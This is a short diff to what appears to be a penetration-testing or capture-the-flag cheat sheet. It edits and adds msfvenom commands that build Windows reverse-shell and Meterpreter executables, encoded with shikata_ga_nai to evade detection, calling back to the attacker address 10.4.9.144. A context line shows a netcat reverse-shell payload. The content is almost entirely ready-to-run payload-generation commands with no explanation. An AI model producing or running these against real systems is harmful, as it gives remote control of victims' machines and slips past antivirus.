@@ -197,7 +197,12 @@ msfvenom -p cmd/unix/reverse_netcat lhost=10.4.9.144 lport=4444 R
 
 generate reverse shell windows exe
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=10.4.9.144 LPORT=1234 -e x86/shikata_ga_nai -f exe -o Advanced.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=10.4.9.144 LPORT=1234 -e x86/shikata_ga_nai -f exe -o shell.exe
+```
+
+generate meterpreter reverse shell exe
+```
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.4.9.144 LPORT=1234 -f exe -o reverseShell.exe
 ```
 
 ## listen for reverse shell
